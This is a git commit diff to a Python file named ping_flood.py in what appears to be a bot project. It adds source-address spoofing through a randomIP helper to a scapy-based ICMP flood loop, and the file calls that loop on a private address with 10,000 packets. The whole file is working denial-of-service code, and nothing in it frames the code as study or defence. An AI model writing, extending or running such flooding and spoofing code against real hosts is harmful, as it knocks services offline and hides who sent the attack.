59b454b3b5618ee175c9c8ec92d212cba15920f4
L-Bain <larrybain01@gmail.com>
2022-05-17 19:20:25 +1000

    Added randomIP source to ping flood

--- icarus_bot/ping_flood.py
+++ icarus_bot/ping_flood.py
@@ -1,9 +1,10 @@
 from scapy.all import IP, ICMP, send
+from utilities import randomIP
 
 
 def PING_Flood(targetIP, numPackets):
     while numPackets > 0:
-        send(IP(dst=targetIP)/ICMP(), verbose=0)
+        send(IP(dst=targetIP, src=randomIP())/ICMP(), verbose=0)
         numPackets = numPackets - 1
 
 PING_Flood('192.168.1.220', 10000)
